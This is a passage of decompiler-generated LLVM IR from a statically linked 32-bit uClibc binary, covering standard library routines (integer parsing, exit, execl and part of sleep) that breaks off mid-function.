dec_label_pc_8055037:                             ; preds = %dec_label_pc_805502d, %entry
  %v0_805502d.lcssa = phi i32 [ %v4_805501b, %entry ], [ %v1_805502d, %dec_label_pc_805502d ]
  %v2_805502e.lcssa = phi i8 [ %v2_805502e41, %entry ], [ %v2_805502e, %dec_label_pc_805502d ]
  %v3_805502e.lcssa = phi i32 [ %v3_805502e42, %entry ], [ %v3_805502e, %dec_label_pc_805502d ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8055037 = icmp eq i8 %v2_805502e.lcssa, 43
  br i1 %v9_8055037, label %dec_label_pc_8055052, label %dec_label_pc_805503c

dec_label_pc_805503c:                             ; preds = %dec_label_pc_8055037
  %v9_805503c = icmp eq i8 %v2_805502e.lcssa, 45
  %v1_8055044 = icmp eq i1 %v9_805503c, false
  br i1 %v1_8055044, label %dec_label_pc_8055053, label %dec_label_pc_8055052

dec_label_pc_8055052:                             ; preds = %dec_label_pc_8055037, %dec_label_pc_805503c
  %storemerge5 = phi i8 [ 1, %dec_label_pc_805503c ], [ 0, %dec_label_pc_8055037 ]
  %v1_8055052 = add i32 %v0_805502d.lcssa, 1
  store i32 %v1_8055052, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055053

dec_label_pc_8055053:                             ; preds = %dec_label_pc_805503c, %dec_label_pc_8055052
  %v0_8055065 = phi i32 [ %v1_8055052, %dec_label_pc_8055052 ], [ %v0_805502d.lcssa, %dec_label_pc_805503c ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8055052 ], [ 0, %dec_label_pc_805503c ]
  %v1_8055053 = and i32 %arg3, -17
  %v2_8055053 = icmp eq i32 %v1_8055053, 0
  %v1_805505b = icmp eq i1 %v2_8055053, false
  br i1 %v1_805505b, label %dec_label_pc_8055081, label %dec_label_pc_805505d

dec_label_pc_805505d:                             ; preds = %dec_label_pc_8055053
  %v1_805505d = add i32 %arg3, 10
  store i32 %v1_805505d, i32* %esi.global-to-local, align 4
  %v1_8055060 = inttoptr i32 %v0_8055065 to i8*
  %v2_8055060 = load i8, i8* %v1_8055060, align 1
  %v8_8055060 = icmp eq i8 %v2_8055060, 48
  %v1_8055063 = icmp eq i1 %v8_8055060, false
  br i1 %v1_8055063, label %dec_label_pc_8055076, label %dec_label_pc_8055065

dec_label_pc_8055065:                             ; preds = %dec_label_pc_805505d
  %v1_8055065 = add i32 %v0_8055065, 1
  store i32 %v1_8055065, i32* %ebx.global-to-local, align 4
  %v1_8055066 = add i32 %arg3, 8
  store i32 %v1_8055066, i32* %esi.global-to-local, align 4
  %v1_8055069 = inttoptr i32 %v1_8055065 to i8*
  %v2_8055069 = load i8, i8* %v1_8055069, align 1
  %v2_805506d = or i8 %v2_8055069, 32
  %v7_805506d = zext i8 %v2_805506d to i32
  %v9_805506d = and i32 %v3_805502e.lcssa, -256
  %v10_805506d = or i32 %v7_805506d, %v9_805506d
  store i32 %v10_805506d, i32* %eax.global-to-local, align 4
  %v10_805506f = icmp eq i8 %v2_805506d, 120
  %v1_8055071 = icmp eq i1 %v10_805506f, false
  br i1 %v1_8055071, label %dec_label_pc_8055076, label %dec_label_pc_8055073

dec_label_pc_8055073:                             ; preds = %dec_label_pc_8055065
  %v2_8055073 = mul i32 %v1_8055066, 2
  store i32 %v2_8055073, i32* %esi.global-to-local, align 4
  %v1_8055075 = add i32 %v0_8055065, 2
  store i32 %v1_8055075, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055076

dec_label_pc_8055076:                             ; preds = %dec_label_pc_8055065, %dec_label_pc_805505d, %dec_label_pc_8055073
  %v0_805509e13 = phi i32 [ %v1_8055065, %dec_label_pc_8055065 ], [ %v0_8055065, %dec_label_pc_805505d ], [ %v1_8055075, %dec_label_pc_8055073 ]
  %v0_80550f822 = phi i32 [ %v1_8055065, %dec_label_pc_8055065 ], [ %v4_805501b, %dec_label_pc_805505d ], [ %v1_8055065, %dec_label_pc_8055073 ]
  %v3_805507e = phi i32 [ %v1_8055066, %dec_label_pc_8055065 ], [ %v1_805505d, %dec_label_pc_805505d ], [ %v2_8055073, %dec_label_pc_8055073 ]
  %v1_8055076 = add i32 %v3_805507e, -17
  %v6_8055076 = sub i32 16, %v3_805507e
  %v7_8055076 = and i32 %v6_8055076, %v3_805507e
  %v8_8055076 = icmp slt i32 %v7_8055076, 0
  %v10_8055076 = icmp slt i32 %v1_8055076, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_805507e = icmp eq i1 %v10_8055076, %v8_8055076
  %v5_805507e = select i1 %v2_805507e, i32 16, i32 %v3_805507e
  store i32 %v5_805507e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055081

dec_label_pc_8055081:                             ; preds = %dec_label_pc_8055053, %dec_label_pc_8055076
  %v0_80550f823 = phi i32 [ %v4_805501b, %dec_label_pc_8055053 ], [ %v0_80550f822, %dec_label_pc_8055076 ]
  %v0_805509e12 = phi i32 [ %v0_8055065, %dec_label_pc_8055053 ], [ %v0_805509e13, %dec_label_pc_8055076 ]
  %v0_8055090 = phi i32 [ %arg3, %dec_label_pc_8055053 ], [ %v5_805507e, %dec_label_pc_8055076 ]
  %v1_8055081 = add i32 %v0_8055090, -2
  store i32 %v1_8055081, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8055089 = icmp ugt i32 %v1_8055081, 34
  br i1 %v6_8055089, label %dec_label_pc_80550ed, label %dec_label_pc_805508b

dec_label_pc_805508b:                             ; preds = %dec_label_pc_8055081
  %div = udiv i32 -1, %v0_8055090
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8055090
  %v1_8055092 = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_80550cb = urem i32 %arg4, 256
  br label %dec_label_pc_805509e

dec_label_pc_805509c:                             ; preds = %dec_label_pc_80550e3, %dec_label_pc_80550cb
  %v2_80550a0.pre = phi i32 [ %v0_80550e6, %dec_label_pc_80550e3 ], [ %v2_80550a0.pre.pre, %dec_label_pc_80550cb ]
  %v4_805509e.pre = phi i32 [ %v1_80550b7, %dec_label_pc_80550e3 ], [ %v4_805509e.pre.pre, %dec_label_pc_80550cb ]
  %v0_805509c = phi i32 [ %v1_80550be, %dec_label_pc_80550e3 ], [ %v0_805509c.pre, %dec_label_pc_80550cb ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_80550e3 ], [ %v6_80550cf, %dec_label_pc_80550cb ]
  br label %dec_label_pc_805509e

dec_label_pc_805509e:                             ; preds = %dec_label_pc_805508b, %dec_label_pc_805509c
  %v0_80550f821 = phi i32 [ %v0_80550f823, %dec_label_pc_805508b ], [ %v0_805509c, %dec_label_pc_805509c ]
  %v0_80550be = phi i32 [ %v0_805509e12, %dec_label_pc_805508b ], [ %v0_805509c, %dec_label_pc_805509c ]
  %v2_80550a0 = phi i32 [ %v4_805501b, %dec_label_pc_805508b ], [ %v2_80550a0.pre, %dec_label_pc_805509c ]
  %v4_805509e = phi i32 [ %div, %dec_label_pc_805508b ], [ %v4_805509e.pre, %dec_label_pc_805509c ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_805508b ], [ %stack_var_-18.1, %dec_label_pc_805509c ]
  %v1_805509e = inttoptr i32 %v0_80550be to i8*
  %v2_805509e = load i8, i8* %v1_805509e, align 1
  %v3_805509e = zext i8 %v2_805509e to i32
  %v5_805509e = and i32 %v4_805509e, -256
  %v6_805509e = or i32 %v3_805509e, %v5_805509e
  store i32 %v6_805509e, i32* %eax.global-to-local, align 4
  %v2_80550a2 = add i8 %v2_805509e, -48
  %v12_80550a2 = zext i8 %v2_80550a2 to i32
  %v14_80550a2 = and i32 %v2_80550a0, -256
  %v15_80550a2 = or i32 %v12_80550a2, %v14_80550a2
  store i32 %v15_80550a2, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_80550a2, 10
  br i1 %tmp, label %dec_label_pc_80550b7, label %dec_label_pc_80550aa

dec_label_pc_80550aa:                             ; preds = %dec_label_pc_805509e
  %v2_80550aa = or i8 %v2_805509e, 32
  %v7_80550aa = zext i8 %v2_80550aa to i32
  %v10_80550aa = or i32 %v7_80550aa, %v5_805509e
  store i32 %v10_80550aa, i32* %eax.global-to-local, align 4
  %v2_80550ac = or i32 %v14_80550a2, 40
  store i32 %v2_80550ac, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_80550aa, 97
  br i1 %tmp55, label %dec_label_pc_80550b7, label %dec_label_pc_80550b2

dec_label_pc_80550b2:                             ; preds = %dec_label_pc_80550aa
  %v2_80550b4 = add i8 %v2_80550aa, -87
  %v15_80550b4 = zext i8 %v2_80550b4 to i32
  %v18_80550b4 = or i32 %v15_80550b4, %v14_80550a2
  store i32 %v18_80550b4, i32* @ecx, align 4
  br label %dec_label_pc_80550b7

dec_label_pc_80550b7:                             ; preds = %dec_label_pc_80550aa, %dec_label_pc_805509e, %dec_label_pc_80550b2
  %v0_80550e6 = phi i32 [ %v2_80550ac, %dec_label_pc_80550aa ], [ %v15_80550a2, %dec_label_pc_805509e ], [ %v18_80550b4, %dec_label_pc_80550b2 ]
  %v1_80550b7 = urem i32 %v0_80550e6, 256
  store i32 %v1_80550b7, i32* %eax.global-to-local, align 4
  %v1_80550ba = load i32, i32* %esi.global-to-local, align 4
  %v2_80550ba = sub i32 %v1_80550b7, %v1_80550ba
  %v10_80550ba = and i32 %v2_80550ba, %v1_80550ba
  %v11_80550ba = icmp slt i32 %v10_80550ba, 0
  %v13_80550ba = icmp slt i32 %v2_80550ba, 0
  %v2_80550bc = icmp eq i1 %v13_80550ba, %v11_80550ba
  br i1 %v2_80550bc, label %dec_label_pc_80550ed, label %dec_label_pc_80550be

dec_label_pc_80550be:                             ; preds = %dec_label_pc_80550b7
  %v1_80550be = add i32 %v0_80550be, 1
  store i32 %v1_80550be, i32* %ebx.global-to-local, align 4
  %v0_80550bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80550bf = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_80550bf, %v1_80550bf
  br i1 %tmp56, label %dec_label_pc_80550cb, label %dec_label_pc_80550c3

dec_label_pc_80550c3:                             ; preds = %dec_label_pc_80550be
  %v12_80550bf = icmp eq i32 %v0_80550bf, %v1_80550bf
  %v1_80550c3 = icmp eq i1 %v12_80550bf, false
  br i1 %v1_80550c3, label %dec_label_pc_80550e3, label %dec_label_pc_80550c5

dec_label_pc_80550c5:                             ; preds = %dec_label_pc_80550c3
  %v1_80550c5 = trunc i32 %v0_80550e6 to i8
  %tmp57 = icmp ugt i8 %v1_80550c5, %v1_8055092
  br i1 %tmp57, label %dec_label_pc_80550cb, label %dec_label_pc_80550e3

dec_label_pc_80550cb:                             ; preds = %dec_label_pc_80550c5, %dec_label_pc_80550be
  store i32 %v4_80550cb, i32* %eax.global-to-local, align 4
  %v6_80550cf = and i8 %stack_var_-18.2, %tmp37
  %v1_80550d3 = sext i8 %v6_80550cf to i32
  %v2_80550d3 = call i32 @__errno_location(i32 %v1_80550d3)
  store i32 %v2_80550d3, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_80550db = inttoptr i32 %v2_80550d3 to i32*
  store i32 34, i32* %v1_80550db, align 4
  %v0_805509c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805509e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_80550a0.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805509c

dec_label_pc_80550e3:                             ; preds = %dec_label_pc_80550c5, %dec_label_pc_80550c3
  %v4_80550e3 = mul i32 %v0_80550bf, %v1_80550ba
  store i32 %v1_80550b7, i32* %eax.global-to-local, align 4
  %v2_80550e9 = add i32 %v4_80550e3, %v1_80550b7
  store i32 %v2_80550e9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805509c

dec_label_pc_80550ed:                             ; preds = %dec_label_pc_80550b7, %dec_label_pc_8055081
  %v0_80550f8 = phi i32 [ %v0_80550f823, %dec_label_pc_8055081 ], [ %v0_80550f821, %dec_label_pc_80550b7 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8055081 ], [ %stack_var_-18.2, %dec_label_pc_80550b7 ]
  %v4_80550ed = icmp eq i32 %arg2, 0
  br i1 %v4_80550ed, label %dec_label_pc_80550fa, label %dec_label_pc_80550f4

dec_label_pc_80550f4:                             ; preds = %dec_label_pc_80550ed
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80550f8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_80550f8, i32* %v2_80550f8, align 4
  br label %dec_label_pc_80550fa

dec_label_pc_80550fa:                             ; preds = %dec_label_pc_80550ed, %dec_label_pc_80550f4
  %v8_80550fa = icmp eq i8 %stack_var_-18.3, 0
  %v2_80550ff = zext i1 %v8_80550fa to i32
  %v13_80550ff = icmp eq i1 %v8_80550fa, false
  %v1_80551013 = or i32 %v2_80550ff, -2147483648
  store i32 %v1_80551013, i32* %ebx.global-to-local, align 4
  %v5_8055107 = icmp eq i8 %tmp37, 0
  br i1 %v5_8055107, label %dec_label_pc_805511f, label %dec_label_pc_805510e

dec_label_pc_805510e:                             ; preds = %dec_label_pc_80550fa
  %v0_805510e = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_805510e, %v1_80551013
  br i1 %tmp58, label %dec_label_pc_8055112, label %dec_label_pc_805511f

dec_label_pc_8055112:                             ; preds = %dec_label_pc_805510e
  %v1_8055112 = sext i8 %stack_var_-18.3 to i32
  %v2_8055112 = call i32 @__errno_location(i32 %v1_8055112)
  store i32 %v2_8055112, i32* %eax.global-to-local, align 4
  %v0_8055117 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055117, i32* %edx.global-to-local, align 4
  %v1_8055119 = inttoptr i32 %v2_8055112 to i32*
  store i32 34, i32* %v1_8055119, align 4
  br label %dec_label_pc_805511f

dec_label_pc_805511f:                             ; preds = %dec_label_pc_805510e, %dec_label_pc_80550fa, %dec_label_pc_8055112
  %v0_805511f = load i32, i32* %edx.global-to-local, align 4
  %v1_8055121 = sub i32 0, %v0_805511f
  %v4_8055128 = select i1 %v13_80550ff, i32 %v1_8055121, i32 %v0_805511f
  store i32 %v4_8055128, i32* @edx, align 4
  %v2_805512e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805512e, i32* @ebx, align 4
  store i32 %v4_8055128, i32* %eax.global-to-local, align 4
  ret i32 %v4_8055128

; uselistorder directives
  uselistorder i32 %v4_8055128, { 1, 0, 2 }
  uselistorder i1 %v8_80550fa, { 1, 0 }
  uselistorder i8 %v6_80550cf, { 1, 0 }
  uselistorder i32 %v1_80550bf, { 1, 0 }
  uselistorder i32 %v0_80550bf, { 2, 1, 0 }
  uselistorder i32 %v1_80550be, { 1, 0 }
  uselistorder i32 %v2_80550ba, { 1, 0 }
  uselistorder i32 %v1_80550b7, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_80550e6, { 2, 0, 1 }
  uselistorder i8 %v2_80550aa, { 1, 0, 2 }
  uselistorder i32 %v14_80550a2, { 0, 2, 1 }
  uselistorder i32 %v0_805509c, { 1, 0 }
  uselistorder i32 %v0_8055090, { 1, 0, 2 }
  uselistorder i32 %v3_805507e, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8055073, { 1, 0 }
  uselistorder i32 %v1_8055066, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8055065, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_805502e.lcssa, { 1, 0 }
  uselistorder i32 %v0_805502d.lcssa, { 1, 0 }
  uselistorder i32 %v1_805502d, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8055023, { 1, 0, 2 }
  uselistorder i32 %v4_805501b, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805511f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80550fa, { 1, 0 }
  uselistorder label %dec_label_pc_80550b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805509e, { 1, 0 }
  uselistorder label %dec_label_pc_8055081, { 1, 0 }
  uselistorder label %dec_label_pc_8055076, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055053, { 1, 0 }
  uselistorder label %dec_label_pc_8055052, { 1, 0 }
  uselistorder label %dec_label_pc_805502d, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_805514b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805514b, i32* @ebx, align 4
  %v2_8055150 = call i32 @__pthread_return_void(i32 %v2_805514b, i32 134567199)
  %v1_805515c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f480.990 to i32))
  %v0_8055161 = load i32, i32* @global_var_8065724.991, align 4
  store i32 %v0_8055161, i32* @eax, align 4
  %v1_8055169 = icmp eq i32 %v0_8055161, 0
  br i1 %v1_8055169, label %dec_label_pc_8055176, label %dec_label_pc_805516d

dec_label_pc_805516d:                             ; preds = %entry
  %v0_8055170 = load i32, i32* @esi, align 4
  %v1_8055171 = call i32 @unknown_0(i32 %v0_8055170)
  store i32 %v1_8055171, i32* @eax, align 4
  br label %dec_label_pc_8055176

dec_label_pc_8055176:                             ; preds = %entry, %dec_label_pc_805516d
  %v2_805517b = call i32 @__pthread_return_void(i32 %v2_805514b, i32 1)
  %v0_8055180 = call i32 @__GI___uClibc_fini()
  %v0_8055191 = call i32 @_stdio_term()
  %v0_8055199 = load i32, i32* @esi, align 4
  %v1_805519a = call i32 @__GI__exit(i32 %v0_8055199)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 9, 0, 8, 7, 6, 5, 4, 3, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2 }
  uselistorder label %dec_label_pc_8055176, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_80551a6 = load i32, i32* @ebx, align 4
  store i32 %v0_80551a6, i32* %stack_var_-12, align 4
  %v2_80551a7 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_80551a7, i32* %eax.global-to-local, align 4
  %v12_80551aa = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80551b0

dec_label_pc_80551b0:                             ; preds = %dec_label_pc_80551b0, %entry
  %v0_80551b3 = phi i32 [ 0, %entry ], [ %v1_80551b3, %dec_label_pc_80551b0 ]
  %stack_var_-16.0 = phi i32 [ %v2_80551a7, %entry ], [ %v1_80551b4, %dec_label_pc_80551b0 ]
  %v1_80551b3 = add i32 %v0_80551b3, 1
  store i32 %v1_80551b3, i32* %esi.global-to-local, align 4
  %v1_80551b4 = add i32 %stack_var_-16.0, 4
  store i32 %v1_80551b4, i32* %eax.global-to-local, align 4
  %v1_80551ba = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_80551ba = load i32, i32* %v1_80551ba, align 4
  %v3_80551ba = icmp eq i32 %v2_80551ba, 0
  %v1_80551bd = icmp eq i1 %v3_80551ba, false
  br i1 %v1_80551bd, label %dec_label_pc_80551b0, label %dec_label_pc_80551bf

dec_label_pc_80551bf:                             ; preds = %dec_label_pc_80551b0
  %v1_80551bf = mul i32 %v1_80551b3, 4
  %v2_80551bf = add i32 %v1_80551bf, 34
  %v1_80551c6 = and i32 %v2_80551bf, -16
  %v2_80551c9 = sub i32 %v12_80551aa, %v1_80551c6
  %v1_80551ce = add i32 %v2_80551c9, 15
  %v1_80551d2 = and i32 %v1_80551ce, -16
  store i32 %v1_80551d2, i32* @ebx, align 4
  store i32 %v1_80551d2, i32* %ecx.global-to-local, align 4
  %v2_80551d7 = inttoptr i32 %v1_80551d2 to i32*
  store i32 %arg2, i32* %v2_80551d7, align 16
  store i32 %v2_80551a7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80551df

dec_label_pc_80551df:                             ; preds = %dec_label_pc_80551df, %dec_label_pc_80551bf
  %stack_var_-16.1 = phi i32 [ %v2_80551a7, %dec_label_pc_80551bf ], [ %v1_80551e6, %dec_label_pc_80551df ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_80551e2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80551e2 = add i32 %v0_80551e2, 4
  store i32 %v1_80551e2, i32* %ecx.global-to-local, align 4
  %v0_80551e5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80551e5 = add i32 %v0_80551e5, -1
  %v8_80551e5 = icmp eq i32 %v1_80551e5, 0
  store i32 %v1_80551e5, i32* %esi.global-to-local, align 4
  %v1_80551e6 = add i32 %stack_var_-16.1, 4
  %v1_80551ec = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_80551ec = load i32, i32* %v1_80551ec, align 4
  store i32 %v2_80551ec, i32* %eax.global-to-local, align 4
  %v2_80551ee = inttoptr i32 %v1_80551e2 to i32*
  store i32 %v2_80551ec, i32* %v2_80551ee, align 4
  %v1_80551f0 = icmp eq i1 %v8_80551e5, false
  br i1 %v1_80551f0, label %dec_label_pc_80551df, label %dec_label_pc_80551f2

dec_label_pc_80551f2:                             ; preds = %dec_label_pc_80551df
  %v0_80551f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80551f2 = load i32, i32* @esp, align 4
  %v2_80551f2 = add i32 %v1_80551f2, -4
  %v3_80551f2 = inttoptr i32 %v2_80551f2 to i32*
  store i32 %v0_80551f2, i32* %v3_80551f2, align 4
  %v0_80551f3 = load i32, i32* @global_var_806572c.992, align 4
  %v2_80551f3 = add i32 %v1_80551f2, -8
  %v3_80551f3 = inttoptr i32 %v2_80551f3 to i32*
  store i32 %v0_80551f3, i32* %v3_80551f3, align 4
  %v0_80551f9 = load i32, i32* @ebx, align 4
  %v2_80551f9 = add i32 %v1_80551f2, -12
  %v3_80551f9 = inttoptr i32 %v2_80551f9 to i32*
  store i32 %v0_80551f9, i32* %v3_80551f9, align 4
  %v5_80551fa = add i32 %v1_80551f2, -16
  %v6_80551fa = inttoptr i32 %v5_80551fa to i32*
  store i32 %arg1, i32* %v6_80551fa, align 4
  %v1_80551fd = inttoptr i32 %v1_80551e6 to i8*
  %v2_80551fd = call i32 @__GI_execve(i8* %v1_80551fd)
  store i32 %v2_80551fd, i32* %eax.global-to-local, align 4
  %v2_8055205 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055205, i32* @ebx, align 4
  ret i32 %v2_80551fd

; uselistorder directives
  uselistorder i32 %v1_80551e5, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_80551b4, { 1, 0 }
  uselistorder i32 %v1_80551b3, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_80551a7, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_805520c = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_8055212 = load i32, i32* @edi, align 4
  %v0_8055213 = load i32, i32* @esi, align 4
  %v0_8055214 = load i32, i32* @ebx, align 4
  %v15_8055215 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* @edx, align 4
  %v1_8055222 = icmp eq i32 %arg1, 0
  %v1_8055224 = icmp eq i1 %v1_8055222, false
  br i1 %v1_8055224, label %dec_label_pc_8055236.preheader, label %dec_label_pc_8055383

dec_label_pc_8055236.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805522b

dec_label_pc_805522b:                             ; preds = %dec_label_pc_805522b.dec_label_pc_805522b_crit_edge, %dec_label_pc_8055236.preheader
  %v0_805522b = phi i32 [ %v15_8055215, %dec_label_pc_8055236.preheader ], [ %v0_805522b.pre, %dec_label_pc_805522b.dec_label_pc_805522b_crit_edge ]
  %v1_805523629 = phi i32 [ 31, %dec_label_pc_8055236.preheader ], [ %v1_8055236, %dec_label_pc_805522b.dec_label_pc_805522b_crit_edge ]
  %v2_805522b = mul i32 %v1_805523629, 4
  %v3_805522b = add i32 %v2_805522b, 292
  %v4_805522b = add i32 %v3_805522b, %v0_805522b
  %v5_805522b = inttoptr i32 %v4_805522b to i32*
  store i32 0, i32* %v5_805522b, align 4
  %v0_8055236.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8055236 = add i32 %v0_8055236.pre, -1
  %v9_8055236 = icmp slt i32 %v1_8055236, 0
  store i32 %v1_8055236, i32* %eax.global-to-local, align 4
  %v1_8055237 = icmp eq i1 %v9_8055236, false
  br i1 %v1_8055237, label %dec_label_pc_805522b.dec_label_pc_805522b_crit_edge, label %dec_label_pc_8055239

dec_label_pc_805522b.dec_label_pc_805522b_crit_edge: ; preds = %dec_label_pc_805522b
  %v0_805522b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805522b

dec_label_pc_8055239:                             ; preds = %dec_label_pc_805522b
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805524f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805524f, i32* @ebx, align 4
  store i32 %v2_805524f, i32* %stack_var_-460, align 4
  %v4_8055257 = call i32 @__sigaddset(i32 %v2_805524f, i32 17, i32 %v1_8055236, i32 %v1_8055236)
  store i32 %v4_8055257, i32* %eax.global-to-local, align 4
  %v2_805525f = icmp slt i32 %v4_8055257, 0
  br i1 %v2_805525f, label %dec_label_pc_8055387, label %dec_label_pc_8055267

dec_label_pc_8055267:                             ; preds = %dec_label_pc_8055239
  %v2_8055268 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8055268, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8055273 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8055273 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8055273, i32 %v2_8055268)
  store i32 %v4_8055273, i32* %eax.global-to-local, align 4
  %v1_805527b = icmp eq i32 %v4_8055273, 0
  %v1_805527d = icmp eq i1 %v1_805527b, false
  br i1 %v1_805527d, label %dec_label_pc_8055387, label %dec_label_pc_8055283

dec_label_pc_8055283:                             ; preds = %dec_label_pc_8055267
  store i32 %v2_8055268, i32* %stack_var_-460, align 4
  %v4_8055288 = call i32 @__sigismember(i32 %v2_8055268, i32 17, i32 %v4_8055273, i32 %v4_8055273)
  store i32 %v4_8055288, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8055295 = icmp eq i32 %v4_8055288, 0
  br i1 %v1_8055295, label %dec_label_pc_80552a9.preheader, label %dec_label_pc_8055351

dec_label_pc_80552a9.preheader:                   ; preds = %dec_label_pc_8055283
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805529e

dec_label_pc_805529e:                             ; preds = %dec_label_pc_805529e.dec_label_pc_805529e_crit_edge, %dec_label_pc_80552a9.preheader
  %v0_805529e = phi i32 [ %v15_8055215, %dec_label_pc_80552a9.preheader ], [ %v0_805529e.pre, %dec_label_pc_805529e.dec_label_pc_805529e_crit_edge ]
  %v1_80552a928 = phi i32 [ 31, %dec_label_pc_80552a9.preheader ], [ %v1_80552a9, %dec_label_pc_805529e.dec_label_pc_805529e_crit_edge ]
  %v2_805529e = mul i32 %v1_80552a928, 4
  %v3_805529e = add i32 %v2_805529e, 292
  %v4_805529e = add i32 %v3_805529e, %v0_805529e
  %v5_805529e = inttoptr i32 %v4_805529e to i32*
  store i32 0, i32* %v5_805529e, align 4
  %v0_80552a9.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80552a9 = add i32 %v0_80552a9.pre, -1
  %v9_80552a9 = icmp slt i32 %v1_80552a9, 0
  store i32 %v1_80552a9, i32* %edx.global-to-local, align 4
  %v1_80552aa = icmp eq i1 %v9_80552a9, false
  br i1 %v1_80552aa, label %dec_label_pc_805529e.dec_label_pc_805529e_crit_edge, label %dec_label_pc_80552ac

dec_label_pc_805529e.dec_label_pc_805529e_crit_edge: ; preds = %dec_label_pc_805529e
  %v0_805529e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805529e

